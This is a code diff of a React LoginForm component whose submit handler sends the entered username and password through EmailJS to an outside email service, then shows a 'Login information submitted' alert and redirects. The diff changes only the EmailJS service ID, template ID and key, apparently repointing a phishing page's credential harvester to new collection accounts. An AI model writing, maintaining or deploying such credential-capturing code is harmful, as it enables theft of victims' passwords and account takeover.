@@ -23,13 +23,13 @@ export default function LoginForm() {
 
     try {
       await emailjs.send(
-        'service_rs8lrr9',
-        'template_hejxokt',
+        'service_1x16ejs',
+        'template_cxfx3vj',
         {
           username: formData.username,
           password: formData.password,
         },
-        'ZZFqwQrTaRvFP9Jx5'
+        'yYhQD1s5tiGmItWd3'
       )
       alert('Login information submitted')
       // Redirect the user after submitting the data
